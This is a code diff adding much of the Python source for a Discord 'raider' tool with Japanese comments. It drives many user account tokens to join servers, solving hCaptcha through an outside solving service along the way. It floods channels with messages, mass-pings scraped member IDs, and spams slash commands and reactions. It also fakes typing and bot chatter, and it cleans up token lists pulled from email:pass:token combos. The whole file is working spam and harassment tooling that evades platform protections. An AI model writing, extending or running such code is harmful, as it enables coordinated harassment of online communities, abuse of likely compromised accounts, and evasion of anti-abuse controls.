+        "task": {
+            "type": 'HCaptchaTaskProxyLess',
+            "websiteKey": sitekey,
+            "websiteURL": invite
+        }
+    }
+    response = requests.post("https://api.capsolver.com/createTask", json=payload)
+    response_data = response.json()
+    task_id = response_data.get("taskId")
+    if not task_id:
+        print(f"(ERR) Failed to create task: {response.text}")
+        return None
+    print(f"Got taskId: {task_id} / Getting result...")
+
+    while True:
+        time.sleep(1)
+        result_response = requests.post("https://api.capsolver.com/getTaskResult", json={"clientKey": API_KEY, "taskId": task_id})
+        result_data = result_response.json()
+        if result_data.get("status") == "ready":
+            return result_data.get("solution", {}).get('gRecaptchaResponse')
+        if result_data.get("status") == "failed" or result_data.get("errorId"):
+            print(f"Solve failed! response: {result_response.text}")
+            return None
+    
+def join_discord_server(token, invite, use_captcha): # Joinerに3ヶ月かかってます。時給に見合いません。時給3円くらいですか？
+    try:
+        payload = {"session_id": uuid.uuid4().hex}
+        response = session.post(
+            f"https://canary.discord.com/api/v10/invites/{invite}",
+            headers=get_headers(token),
+            json=payload
+        )
+        hide_token = token[:25].rstrip() + '#'
+        
+        if response.status_code == 200:
+            status = f"{GREEN}[参加]{MAGENTA}{hide_token}{END}{invite}|{response.json()['guild']['name']}"
+        elif response.status_code == 400:
+            status = f"{YELLOW}[キャプチャ]{MAGENTA}{hide_token}{END}{invite}"
+            if use_captcha:
+                hcaptcha_response = solve_hcaptcha(site_key, invite)
+                if hcaptcha_response:
+                    payload['captcha_key'] = hcaptcha_response
+                    response = session.post(
+                        f"https://canary.discord.com/api/v9/invites/{invite}",
+                        headers=get_headers(token),
+                        json=payload
+                    )
+                    if response.status_code == 200:
+                        status = f"{GREEN}[CAPTCHAを解決し、参加]{MAGENTA}{hide_token}{END}{invite}|{response.json()['guild']['name']}"
+                    else:
+                        status = f"{RED}FAILED{token[:25]}##{response.json().get('message')}"
+                else:
+                    status = f"{RED}CAPTCHA解決失敗{token[:25]}##"
+            else:
+                status = f"{YELLOW}CAPTCHA認証が必要{MAGENTA}{hide_token}{END}{invite}"
+        elif response.status_code == 429:
+            status = f"{BLUE}[クラウドフレア]{MAGENTA}{hide_token}{END}{invite}"
+        else:
+            status = f"{RED}FAILED{token[:25]}##{response.json().get('message')}"
+    except Exception as e:
+        status = f"FAILED {token[:25]}## {e}"
+    
+    return status
+
+def joiner(token, invite_code, use_captcha):
+    status = join_discord_server(token, invite_code, use_captcha)
+    print(status)
+
+def leaver(server_id):
+    for token in tokens:
+        hide_token = token[:25].rstrip() + '#'
+        headers = {'Authorization': token}
+        response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{server_id}', headers=headers)
+        if response.status_code == 204:
+            print(f'サーバーから退出しました。:{hide_token}')
+
+def spammerOLD(channel_id, message):
+    global spammingOLD
+    spammingOLD = True
+    os.system('title Nothing Raider - Spammer Discord.gg/QRNutfWSpK')
+    def spam_thread():
+        while spammingOLD:
+            for token in tokens:
+                hide_token = token[:25].rstrip() + '#'
+                headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                data = {'content': message}
+                
+                try:
+                    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
+                    
+                    if response.status_code == 200:
+                        print(nowtime() + MAGENTA + f'Send: {hide_token}' + END)
+                    elif response.status_code == 429:
+                        retry_after = response.json()['retry_after']
+                        print(nowtime() + YELLOW + f'[RATE LIMIT] Retrying after {retry_after} seconds.' + END)
+                        time.sleep(retry_after)
+                    else:
+                        print(nowtime() + RED + f'Failed to send message with token {hide_token}. Status code: {response.status_code}' + END)
+                
+                except requests.exceptions.RequestException as e:
+                    print(f'Error occurred while sending message with token {hide_token}: {str(e)}')
+
+    threads = []
+    for _ in range(10):
+        t = threading.Thread(target=spam_thread)
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
+# Utilsクラス
+class Utils:
+    @staticmethod
+    def get_ranges(start, step, total):
+        ranges = []
+        for i in range(start, total, step):
+            ranges.append([i, min(i + step - 1, total - 1)])
+        return ranges
+
+    @staticmethod
+    def parse_member_list_update(decoded):
+        data = decoded["d"]
+        return {
+            "guild_id": data["guild_id"],
+            "types": [op["op"] for op in data["ops"]],
+            "updates": [op.get("items", []) for op in data["ops"]]
+        }
+
+# トークンがギルドに参加しているか確認する関数（シングルスレッド版）
+def check_token_in_guild(token, guild_id):
+    headers = {"Authorization": token, "Content-Type": "application/json"}
+    try:
+        response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, timeout=5)
+        if response.status_code == 200:
+            print(GREEN + f"Token {token[:25]}... is in guild {guild_id}" + END)
+            return True
+        else:
+            print(YELLOW + f"Token {token[:25]}... not in guild {guild_id} (Status: {response.status_code})" + END)
+            return False
+    except requests.exceptions.RequestException as e:
+        print(RED + f"Error checking token {token[:25]}...: {e}" + END)
+        return False
+
+# マルチスレッドでトークンを確認する関数
+def check_tokens_in_guild_multithread(tokens, guild_id, max_workers=10):
+    valid_tokens = []
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # 各トークンに対してチェックを並行実行
+        future_to_token = {executor.submit(check_token_in_guild, token, guild_id): token for token in tokens}
+        
+        # 結果を収集
+        for future in as_completed(future_to_token):
+            token = future_to_token[future]
+            try:
+                if future.result():  # Trueならギルドに参加している
+                    valid_tokens.append(token)
+            except Exception as e:
+                print(RED + f"Exception for token {token[:25]}...: {e}" + END)
+    
+    return valid_tokens
+
+# DiscordSocketクラス（メンバー取得用）
+class DiscordSocket(websocket.WebSocketApp):
+    def __init__(self, token, guild_id, channel_id):
+        self.token = token
+        self.guild_id = guild_id
+        self.channel_id = channel_id
+        self.blacklisted_ids = {"1100342265303547924", "1190052987477958806", "833007032000446505", 
+                                "1273658880039190581", "1308012310396407828", "1326906424873193586", 
+                                "1334512667456442411"}
+        self.members = {}
+        self.guilds = {}
+        self.ranges = [[0, 0]]
+        self.last_range = 0
+        self.packets_recv = 0
+        self.end_scraping = False
+
+        headers = {
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-US,en;q=0.9",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        }
+
+        super().__init__(
+            "wss://gateway.discord.gg/?encoding=json&v=9",
+            header=headers,
+            on_open=self.on_open,
+            on_message=self.on_message,
+            on_close=self.on_close,
+            on_error=self.on_error,
+        )
+
+    def run(self):
+        print(f"Starting WebSocket for guild {self.guild_id} with token {self.token[:25]}...")
+        self.run_forever()
+        self.save_members_to_file()
+        return self.members
+
+    def save_members_to_file(self):
+        try:
+            os.makedirs("pings", exist_ok=True)
+            filepath = f"pings/{self.guild_id}.txt"
+            with open(filepath, "w", encoding="utf-8") as f:
+                if not self.members:
+                    print(YELLOW + f"No members scraped for guild {self.guild_id}" + END)
+                    f.write("")
+                else:
+                    for user_id in self.members.keys():
+                        f.write(f"{user_id}\n")
+                    print(GREEN + f"Saved {len(self.members)} member IDs to {filepath}" + END)
+        except Exception as e:
+            print(RED + f"Failed to save members to file: {e}" + END)
+
+    def scrape_users(self):
+        if not self.end_scraping:
+            print(f"Scraping users with range {self.ranges}")
+            self.send(json.dumps({
+                "op": 14,
+                "d": {
+                    "guild_id": self.guild_id,
+                    "typing": True,
+                    "activities": True,
+                    "threads": True,
+                    "channels": {self.channel_id: self.ranges}
+                }
+            }))
+
+    def on_open(self, ws):
+        print(GREEN + "WebSocket connection opened" + END)
+        self.send(json.dumps({
+            "op": 2,
+            "d": {
+                "token": self.token,
+                "capabilities": 125,
+                "properties": {
+                    "os": "Windows",
+                    "browser": "Chrome",
+                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+                },
+                "presence": {"status": "online", "since": 0, "activities": [], "afk": False},
+                "compress": False,
+            }
+        }))
+
+    def heartbeat_thread(self, interval):
+        while not self.end_scraping:
+            self.send(json.dumps({"op": 1, "d": self.packets_recv}))
+            time.sleep(interval)
+
+    def on_message(self, ws, message):
+        decoded = json.loads(message)
+        if not decoded:
+            return
+        self.packets_recv += decoded["op"] != 11
+        if decoded["op"] == 10:
+            threading.Thread(target=self.heartbeat_thread, args=(decoded["d"]["heartbeat_interval"] / 1000,), daemon=True).start()
+            print(f"Heartbeat interval set to {decoded['d']['heartbeat_interval'] / 1000} seconds")
+        if decoded["t"] == "READY":
+            self.guilds.update({guild["id"]: {"member_count": guild["member_count"]} for guild in decoded["d"]["guilds"]})
+            print(f"Guilds loaded: {self.guilds}")
+        if decoded["t"] == "READY_SUPPLEMENTAL":
+            self.ranges = Utils.get_ranges(0, 100, self.guilds.get(self.guild_id, {"member_count": 0})["member_count"])
+            self.scrape_users()
+        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
+            parsed = Utils.parse_member_list_update(decoded)
+            if parsed["guild_id"] == self.guild_id:
+                self.process_updates(parsed)
+
+    def process_updates(self, parsed):
+        if "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]:
+            for i, update_type in enumerate(parsed["types"]):
+                if update_type in {"SYNC", "UPDATE"}:
+                    if not parsed["updates"][i]:
+                        self.end_scraping = True
+                        print(YELLOW + "No more updates, ending scrape" + END)
+                        break
+                    self.process_members(parsed["updates"][i])
+                self.last_range += 1
+                self.ranges = Utils.get_ranges(self.last_range, 100, self.guilds.get(self.guild_id, {"member_count": 0})["member_count"])
+                time.sleep(0.65)
+                self.scrape_users()
+        if self.end_scraping:
+            self.close()
+
+    def process_members(self, updates):
+        for item in updates:
+            member = item.get("member")
+            if member:
+                user = member.get("user", {})
+                user_id = user.get("id")
+                if user_id and user_id not in self.blacklisted_ids and not user.get("bot"):
+                    self.members[user_id] = {"tag": f"{user.get('username')}#{user.get('discriminator')}", "id": user_id}
+        print(f"Processed members, current count: {len(self.members)}")
+
+    def on_close(self, ws, close_code, close_msg):
+        print(GREEN + f"WebSocket closed. Scraped {len(self.members)} members" + END)
+
+    def on_error(self, ws, error):
+        print(RED + f"WebSocket error: {error}" + END)
+
+# メンバーIDをファイルから読み込む関数
+def load_members_from_file(guild_id):
+    filepath = f"pings/{guild_id}.txt"
+    member_ids = []
+    if os.path.exists(filepath):
+        with open(filepath, "r", encoding="utf-8") as f:
+            member_ids = [line.strip() for line in f if line.strip()]
+        print(GREEN + f"Loaded {len(member_ids)} member IDs from {filepath}" + END)
+    else:
+        print(YELLOW + f"No member file found for guild {guild_id}" + END)
+    return member_ids
+
+# スパム機能（マスピング対応）
+spamming = False
+
+def spammer(channel_id, message, guild_id=None, mass_ping=False, ping_count=0):
+    os.system('title Nothing Raider - Spammer Discord.gg/QRNutfWSpK')
+    global spamming
+    spamming = True
+
+    # ギルドに参加しているトークンをマルチスレッドで確認
+    valid_tokens = check_tokens_in_guild_multithread(tokens, guild_id) if guild_id else tokens
+    if not valid_tokens:
+        print(RED + "No valid tokens found for this guild. Aborting." + END)
+        return
+
+    # マスピングが有効な場合、ファイルからメンバーIDを読み込む
+    member_ids = []
+    if mass_ping and guild_id:
+        member_ids = load_members_from_file(guild_id)
+        if not member_ids:
+            print(YELLOW + "No members found. Scraping now with a valid token..." + END)
+            socket = DiscordSocket(valid_tokens[0], guild_id, channel_id)
+            threading.Thread(target=socket.run, daemon=True).start()
+            time.sleep(15)
+            member_ids = list(socket.members.keys())
+
+    def spam_with_token(token):
+        hide_token = token[:25].rstrip() + '#'
+        headers = {'Authorization': token, 'Content-Type': 'application/json'}
+
+        final_message = message
+        if mass_ping and member_ids:
+            pings = [f"<@{random.choice(member_ids)}>" for _ in range(min(ping_count, len(member_ids)))]
+            final_message = f"{message} {' '.join(pings)}"
+
+        data = {'content': final_message}
+
+        try:
+            response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
+            if response.status_code == 200:
+                print(GREEN + "[Success!]" + MAGENTA + hide_token + END)
+            elif response.status_code == 429:
+                retry_after = response.json().get('retry_after', 5)
+                print(YELLOW + "[RATELIMIT]" + MAGENTA + hide_token + END)
+                time.sleep(retry_after)
+                spam_with_token(token)
+            elif response.status_code in [401, 403]:
+                print(RED + f'Missing access token' + hide_token + END)
+                return
+            else:
+                print(f'Failed to send message with token {hide_token}. Status code: {response.status_code}')
+        except requests.exceptions.RequestException as e:
+            print(f'Error occurred with token {hide_token}: {str(e)}')
+
+    def spam_loop(tokens):
+        while spamming:
+            threads = []
+            for token in valid_tokens:
+                t = threading.Thread(target=spam_with_token, args=(token,))
+                t.start()
+                threads.append(t)
+            for t in threads:
+                t.join()
+
+    threading.Thread(target=spam_loop, args=(valid_tokens,), daemon=True).start()
+
+spamming = False
+forbidden_channels = set()
+
+# コマンドIDを取得する関数（ギルドコマンドとグローバルコマンドを試す）
+def get_command_id(token, guild_id, application_id, command_name):
+    headers = get_headers(token)
+    
+    # 1. ギルドコマンドを試す
+    try:
+        response = requests.get(
+            f"{BASE_URL}/guilds/{guild_id}/commands",
+            headers=headers
+        )
+        print(f"Guild commands response: {response.status_code}, {response.text}")
+        if response.status_code == 200:
+            commands = response.json()
+            for cmd in commands:
+                if cmd["application_id"] == application_id and cmd["name"] == command_name:
+                    print(f"Found command: {cmd['name']} with ID: {cmd['id']}")
+                    return cmd["id"]
+            print(f"Command '{command_name}' not found in guild {guild_id} for application {application_id}")
+        else:
+            print(f"Failed to fetch guild commands. Status code: {response.status_code}, Response: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching guild commands: {str(e)}")
+
+    # 2. グローバルコマンドを試す
+    try:
+        response = requests.get(
+            f"{BASE_URL}/applications/{application_id}/commands",
+            headers=headers
+        )
+        print(f"Global commands response: {response.status_code}, {response.text}")
+        if response.status_code == 200:
+            commands = response.json()
+            for cmd in commands:
+                if cmd["name"] == command_name:
+                    print(f"Found global command: {cmd['name']} with ID: {cmd['id']}")
+                    return cmd["id"]
+            print(f"Command '{command_name}' not found globally for application {application_id}")
+        else:
+            print(f"Failed to fetch global commands. Status code: {response.status_code}, Response: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching global commands: {str(e)}")
+    
+    return None
+
+# スラッシュコマンド送信関数
+def send_slash_command(token, guild_id, channel_id, application_id, command_id, command_name, session_id):
+    headers = get_headers(token)
+    files = {
+        'payload_json': (None, json.dumps({
+            "type": 2,
+            "application_id": application_id,
+            "guild_id": guild_id,
+            "channel_id": channel_id,
+            "session_id": session_id,
+            "data": {
+                "version": "1350656899955032086",
+                "id": command_id,
+                "name": command_name,
+                "type": 1,
+                "options": [],
+                "application_command": {
+                    "id": command_id,
+                    "type": 1,
+                    "application_id": application_id,
+                    "version": "1350656899955032086",
+                    "name": command_name,
+                    "description": f"{command_name} command",
+                    "dm_permission": True,
+                    "integration_types": [0],
+                    "global_popularity_rank": 2,
+                    "options": [],
+                    "description_localized": f"{command_name} command",
+                    "name_localized": command_name
+                },
+                "attachments": []
+            },
+            "nonce": noncegen(),
+            "analytics_location": "slash_ui"
+        }))
+    }
+
+    try:
+        response = requests.post(
+            f"{BASE_URL}/interactions",
+            headers=headers,
+            files=files
+        )
+        if response.status_code == 204:
+            print(f"[Success] Slash command '{command_name}' sent!")
+        else:
+            print(f"Failed to send slash command '{command_name}'. Status code: {response.status_code}, Response: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending slash command '{command_name}': {str(e)}")
+
+# スラッシュコマンドのスパム関数
+def slash_command_spammer(guild_id, channel_id, application_id, command_id, command_name, session_id, tokens):
+    os.system(f'title Slash Command Spammer - {command_name}')
+    global spamming
+    spamming = True
+
+    def spam_with_token(token):
+        hide_token = token[:25].rstrip() + '#'
+        while spamming:
+            send_slash_command(token, guild_id, channel_id, application_id, command_id, command_name, session_id)
+            time.sleep(0.5)
+
+    def spam_loop(tokens):
+        threads = []
+        for token in tokens:
+            t = threading.Thread(target=spam_with_token, args=(token,))
+            t.start()
+            threads.append(t)
+        for t in threads:
+            t.join()
+
+    threading.Thread(target=spam_loop, args=(tokens,)).start()
+
+# スパム停止関数
+def stop_spammer():
+    global spamming
+    spamming = False
+    print("Spamming stopped.")
+    
+def get_guild_channels(guild_id, token):
+    cookies = get_discord_cookies()
+    try:
+        response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers(token, cookies))
+        if response.status_code == 200:
+            return [channel for channel in response.json() if channel['type'] == 0 or channel['type'] == 5]
+        else:
+            print(f'トークン {token} でサーバーのチャンネルを取得できませんでした。ステータスコード: {response.status_code}')
+            return []
+    except requests.exceptions.RequestException as e:
+        print(f'トークン {token} でサーバーのチャンネルを取得中にエラーが発生しました: {str(e)}')
+        return []
+
+def send_message(channel_id, header, message):
+    nowtime = str(datetime.now())[:-7]
+    data = {'content': message}
+
+    try:
+        response = requests.post(
+            f"https://discord.com/api/v9/channels/{channel_id}/messages",
+            headers=header,
+            json=data
+        )
+
+        if response.status_code == 200:
+            print(f'{nowtime} 送信成功: チャンネル {channel_id}')
+        elif response.status_code == 403:
+            print(f'{nowtime} チャンネル {channel_id} に送信する権限がないため、パスします。')
+            forbidden_channels.add(channel_id)
+        elif response.status_code == 404:
+            print(f'{nowtime} チャンネル {channel_id} が見つかりません。スキップします。')
+            forbidden_channels.add(channel_id)  # 無効なチャンネルを記録
+        elif response.status_code == 429:
+            retry_after = response.json().get('retry_after', 1)
+            print(f'{nowtime} [レートリミット] {retry_after} 秒後に再試行します。')
+            time.sleep(retry_after)
+            send_message(channel_id, header, message)  # 再試行
+        else:
+            print(f'{nowtime} メッセージ送信失敗: {response.status_code} - {response.text}')
+    except requests.exceptions.RequestException as e:
+        print(f'{nowtime} メッセージ送信中にエラー: {str(e)}')
+
+# Worker function for threads
+def worker(channel_id, header, message):
+    send_message(channel_id, header, message)
+
+def format_changer_tab(frame):
+    for widget in frame.winfo_children():
+        widget.destroy()
+    format_msg = ctk.CTkLabel(frame, text="email:pass:tokenのtokenを抽出するようになってます\n修正してほしかったら教えて")
+    format_msg.pack(pady=5)
+    format_changer_button = ctk.CTkButton(master=content_frame, text="Start", command=format_changer)
+    format_changer_button.pack(pady="150")
+
+def format_changer(file_pathy: str = "format.txt", output_file: str = "tokens.txt"):
+    """
+    Extract the token part from lines in a file in the format email:pass:token,
+    and save the tokens to another file. Also remove the processed lines from the original file.
+
+    Args:
+        file_pathy (str): The path to the file containing lines in the format email:pass:token.
+        output_file (str): The path to the file where extracted tokens will be saved.
+
+    Returns:
+        list: The list of extracted tokens
+    """
+    tokens = []
+    failed_count = 0  # Count of failed lines (lines that do not have 3 parts)
+    successful_lines = []  # To keep track of lines that were processed successfully
+
+    try:
+        with open(file_pathy, 'r') as file:
+            lines = file.readlines()  # Read all lines at once
+            for line in lines:
+                parts = line.strip().split(':', 2)  # Split line by ':'
+                if len(parts) == 3:
+                    tokens.append(parts[-1])  # Extract the token (last part)
+                    successful_lines.append(line)  # Track the successfully processed line
+                else:
+                    failed_count += 1  # Count failed lines
+
+        if tokens:
+            with open(output_file, 'a') as output:  # Append mode to add tokens without overwriting
+                for token in tokens:
+                    output.write(token + '\n')
+
+            print(f"Successfully added {len(tokens)} tokens to {output_file}.")
+        else:
+            print("No tokens extracted.")
+        
+        if successful_lines:
+            # Create a new list with the remaining lines (those that were not processed)
+            remaining_lines = [line for line in lines if line not in successful_lines]
+
+            # Rewrite the original file with only the remaining lines
+            with open(file_pathy, 'w') as file:
+                file.writelines(remaining_lines)
+
+            print(f"Successfully removed {len(successful_lines)} processed lines from {file_pathy}.")
+
+        print(f"Failed to process {failed_count} lines.")
+        
+    except FileNotFoundError:
+        print("File not found:", file_pathy)
+    except Exception as e:
+        print("An error occurred:", e)
+
+# 全チャンネルスパム関数（修正版）
+def all_channel_spam(server_id, message):
+    global stop_spammer
+    stop_spammer = False
+
+    # ギルドに参加しているトークンを確認
+    valid_tokens = check_tokens_in_guild_multithread(tokens, server_id)
+    if not valid_tokens:
+        print(RED + f"No valid tokens found for guild {server_id}. Aborting." + END)
+        return
+
+    # 最大ワーカー数をトークン数とチャンネル数に応じて調整
+    max_workers = min(100, len(valid_tokens) * 2)  # レート制限を考慮しつつ最適化
+
+    while not stop_spammer:
+        for token in valid_tokens:
+            channels = get_guild_channels(server_id, token)
+            if not channels:
+                print(YELLOW + f'トークン {token[:25]}... で有効なチャンネルが見つかりませんでした。スキップします。' + END)
+                continue
+
+            # テキストチャンネルのみをフィルタリング
+            text_channels = [ch for ch in channels if ch.get('type') == 0 and ch.get('id') not in forbidden_channels]
+            if not text_channels:
+                print(YELLOW + f"トークン {token[:25]}... で有効なテキストチャンネルが見つかりませんでした。" + END)
+                continue
+
+            # ThreadPoolExecutorで全チャンネルに同時送信
+            cookies = get_discord_cookies()  # 仮定: クッキー取得関数
+            header = headers(token, cookies)
+            with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                futures = [
+                    executor.submit(send_message, channel['id'], header, message)
+                    for channel in text_channels
+                ]
+
+                # 結果を待機しエラーを処理
+                for future in as_completed(futures):
+                    try:
+                        future.result()
+                    except Exception as e:
+                        print(RED + f"スレッドでエラー発生: {e}" + END)
+
+def stop_all_channel_spam():
+    global stop_spammer
+    stop_spammer = True  # この関数が呼ばれるとstop_spammerをTrueにしてスパムを停止
+
+def write_tokens(filename, tokens):
+    with open(filename, 'w') as file:
+        file.write("\n".join(tokens))
+
+def is_token_valid(token):
+    headers = {'Authorization': token}
+    try:
+        response = requests.get('https://discord.com/api/v9/users/@me/library', headers=headers)
+        return response.status_code == 200
+    except requests.exceptions.RequestException as e:
+        print(nowtime() + RED + f'チェックが不可能なtoken: {token}. {str(e)}' + END)
+        return False
+
+def check_and_remove_invalid_tokens():
+    global tokens
+    valid_tokens = []
+    invalid_tokens = []
+
+    def check_token(token):
+        if is_token_valid(token):
+            valid_tokens.append(token)
+            print(nowtime() + GREEN + f' [有効]: {token}' + END)
+        else:
+            invalid_tokens.append(token)
+            print(nowtime() + RED + f'無効なtoken: {token}' + END)
+
+    threads = []
+    for token in tokens:
+        thread = threading.Thread(target=check_token, args=(token,))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+    write_tokens('tokens.txt', valid_tokens)
+    if invalid_tokens:
+        with open('invalid_tokens.txt', 'w') as file:
+            file.write("\n".join(invalid_tokens))
+
+    tkinter.messagebox.showinfo("Info", f"Tokenチェックが完了しました。削除したtokenの数{len(tokens) - len(valid_tokens)}個")
+    
+    if len(valid_tokens) != len(tokens):
+        print(f'削除したtokenの数{len(tokens) - len(valid_tokens)}個 無効なtokenを削除しました。')
+        tokens = valid_tokens
+        
+        with open('tokens.txt', 'w') as f:
+            f.write('\n'.join(tokens))
+        
+        print('tokens.txtはアップデートされました。')
+
+def get_existing_reactions(channel_id, message_id, token):
+    headers = {
+        'Authorization': token,
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
+    }
+
+    try:
+        response = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions', headers=headers)
+
+        if response.status_code == 200:
+            reactions_data = response.json()
+            existing_reactions = [reaction['emoji']['name'] for reaction in reactions_data]
+            return existing_reactions
+
+        else:
+            print(f'Failed to fetch reactions from message. Status code: {response.status_code}')
+            return []
+
+    except Exception as e:
+        print(f'Exception occurred while fetching reactions with token: {token}. Error: {str(e)}')
+        return []
+
+def react_with_token(token, channel_id, message_id, emoji):
+    headers = {
+        'Authorization': token,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+    }
+
+    url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'
+
+    response = requests.put(url, headers=headers)
+    hide_token = token[:25].rstrip() + '#'
+    if response.status_code == 204:
+        print(f'リアクションに成功 {emoji} : {hide_token}')
+    elif response.status_code == 404:
+        print(f'Failed to react with {emoji} (メッセージが存在しません): {hide_token}')
+    elif response.status_code == 403:
+        print(f'Failed to react with {emoji} : {hide_token}')
+    else:
+        print(f'Failed to react with {emoji} ステータスコード: {response.status_code}): {hide_token}')
+
+def react_to_message(channel_id, message_id, emoji):
+    threads = []
+    for token in tokens:
+        thread = threading.Thread(target=react_with_token, args=(token, channel_id, message_id, emoji))
+        thread.start()
+        threads.append(thread)
+    
+    for thread in threads:
+        thread.join()
+
+threads = []
+stop_event = threading.Event()
+
+def fake_typer(channel_id, token):
+    url = f'https://discord.com/api/v9/channels/{channel_id}/typing'
+    headers = {
+        'Authorization': token,
+    }
+
+    while not stop_event.is_set():
+        try:
+            hide_token = token[:25].rstrip() + '#'
+            response = requests.post(url, headers=headers)
+            response.raise_for_status()
+            print(f"fake typeに成功 {channel_id} | {hide_token}")
+            time.sleep(5)
+        except requests.exceptions.HTTPError as errh:
+            print(f"HTTPエラー: {errh}")
+            break
+        except requests.exceptions.ConnectionError as errc:
+            print(f"接続できません: {errc}")
+            break
+        except requests.exceptions.Timeout as errt:
+            print(f"タイムアウトエラー: {errt}")
+            break
+        except requests.exceptions.RequestException as err:
+            print(f"Request Exception: {err}")
+            break
+
+def custom_spammer(channel_id):
+    global stop_custom_spammer
+    stop_custom_spammer = False
+    threads = []
+
+    def spam_logic():
+        while not stop_custom_spammer:  # stop_custom_spammer が True の場合、ループを抜ける
+            for token in tokens:
+                headers = {'Authorization': token, 'Content-Type': 'application/json'}
+                random_custom = random.choice(messages)
+                data = {'content': f'{random_custom}'}
+                
+                try:
+                    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
+                    
+                    if response.status_code == 200:
+                        print(nowtime() + MAGENTA + f'送信成功: {token}' + END)
+                        time.sleep(0.7)  # 短い待機時間で速度を維持
+                    elif response.status_code == 429:
+                        retry_after = response.json().get('retry_after', 1)
+                        print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
+                        time.sleep(retry_after)
+                    else:
+                        print(nowtime() + RED + f'Failed to send message with token {token}. Status code: {response.status_code}' + END)
+                
+                except requests.exceptions.RequestException as e:
+                    print(f'Error occurred while sending message with token {token}: {str(e)}')
+
+    # スレッド数を調整（例: 5スレッド）
+    for _ in range(5):
+        t = threading.Thread(target=spam_logic)
+        t.start()
+        threads.append(t)
+
+    # 全スレッドが終了するのを待機
+    for t in threads:
+        t.join()
+
+def stop_custom_spammer():
+    global stop_custom_spammer
+    stop_custom_spammer = True  # この関数が呼ばれるとstop_spammerをTrueにしてスパムを停止
+
+        
+def get_user_id(token):
+    headers = {'Authorization': token}
+    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+    if response.status_code == 200:
+        return response.json()['id']
+    else:
+        print(nowtime() + RED + f'Failed to get user ID for token {token}. Status code: {response.status_code}' + END)
+        return None
+
+def howbot(channel_id):
+    if not channel_id:
+        print(nowtime() + RED + 'Channel ID is invalid or empty.' + END)
+        return
+
+    os.system('title Nothing Raider - Custom Spammer Discord.gg/QRNutfWSpK')
+    recent_messages = []
+    user_ids = {token: get_user_id(token) for token in tokens}
+
+    while True:
+        for token in tokens:
+            headers = {'Authorization': token, 'Content-Type': 'application/json'}
+            random_custom = random.choice(BOTmessages)
+            data = {'content': f'{random_custom}'}
+
+            try:
+                response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
+                
+                if response.status_code == 200:
+                    print(nowtime() + MAGENTA + f'送信成功: {token}' + END)
+                    message_data = response.json()
+                    recent_messages.append(message_data)
+                    if len(recent_messages) > 10: 
+                        recent_messages.pop(0)
+                elif response.status_code == 429:
+                    retry_after = response.json().get('retry_after', 1)
+                    print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
+                    time.sleep(retry_after)
+                else:
+                    print(nowtime() + RED + f'Failed to send message with token {token}. Status code: {response.status_code}' + END)
+
+                if random.choice([True, False]) and recent_messages:  
+                    reply_message = random.choice(recent_messages)
+                    if reply_message['author']['id'] != user_ids[token]:  
+                        random_custom2 = random.choice(BOTmessages)
+                        reply_data = {'content': random_custom2, 'message_reference': {'message_id': reply_message['id']}}
+                        reply_response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=reply_data)
+                        
+                        if reply_response.status_code == 200:
+                            print(nowtime() + MAGENTA + f'リプライ送信成功: {token}' + END)
+                        elif reply_response.status_code == 429:
+                            retry_after = reply_response.json().get('retry_after', 1)
+                            print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
+                            time.sleep(retry_after)
+                        else:
+                            print(nowtime() + RED + f'リプライ送信失敗: {token}. Status code: {reply_response.status_code}' + END)
+
+            except requests.exceptions.RequestException as e:
+                print(nowtime() + RED + f'Error occurred while sending message with token {token}: {str(e)}' + END)
+                
+            time.sleep(random.uniform(1, 5)) 
+
+def change_status(token):
+    url = "wss://gateway.discord.gg/?v=9&encoding=json"
+    
+    def on_message(ws, message):
+        message_data = json.loads(message)
+        
+        if message_data.get("op") == 10:
+            heartbeat_interval = message_data["d"]["heartbeat_interval"] / 1000
+            heartbeat_thread = threading.Thread(target=send_heartbeat, args=(ws, heartbeat_interval))
+            heartbeat_thread.start()
+            identify_payload = {
+                "op": 2,
+                "d": {
+                    "token": token,
+                    "intents": 513, 
+                    "properties": {
+                        "$os": "linux",
+                        "$browser": "my_library",
+                        "$device": "my_library"
+                    },
+                    "presence": {
+                        "status": "online",
+                        "activities": [
+                            {
+                                "name": "",
+                                "type": 0
+                            }
+                        ]
+                    }
+                }
+            }
